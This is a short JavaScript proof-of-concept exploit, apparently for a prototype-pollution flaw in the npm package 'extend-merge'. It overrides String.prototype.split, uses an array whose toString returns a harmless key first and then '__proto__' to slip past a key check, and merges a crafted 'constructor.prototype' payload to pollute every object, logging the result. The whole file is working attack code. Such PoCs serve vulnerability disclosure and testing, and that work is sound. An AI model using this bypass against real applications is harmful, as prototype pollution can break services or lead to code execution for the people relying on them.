var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const extend_merge = require('extend-merge');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
let obj = {};
console.log({}.polluted);
extend_merge.merge({}, payload);
console.log({}.polluted);